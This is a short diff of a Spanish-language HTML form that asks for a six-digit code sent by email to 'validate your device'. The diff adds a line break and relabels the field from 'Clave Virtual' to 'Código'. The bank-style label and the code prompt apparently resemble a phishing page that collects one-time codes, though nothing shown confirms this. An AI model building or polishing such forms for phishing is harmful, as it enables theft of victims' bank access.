@@ -38,12 +38,13 @@
                 <div align="center">
                     <span class="ingresartxt" style="font-size: 1.1rem;">Ingresa el Código que le enviamos a su correo electrónico para validar tu dispositivo</span>
                 </div>
+                <br>
                 <hr class="line1" color="#C4C4C4">
                 <img class="userimg" src="archivos/Seguridad.svg">
                 <div class="floating-label">
                     <input class="pass" type="tel" placeholder=" " name="cpass" id="cpass" autocomplete="off" maxlength="6" required>
                     <span class="highlight2"></span>
-                    <label>Clave Virtual</label>
+                    <label>Código</label>
                     <img id="imgpass1" src="archivos/ver.png" class="ver" onclick="pass1(); pass2(); pass11();">
                     <img id="imgpass2" src="archivos/ver2.png" class="ver" onclick="pass3(); pass4(); pass33();" style="display: none;">
                 </div>
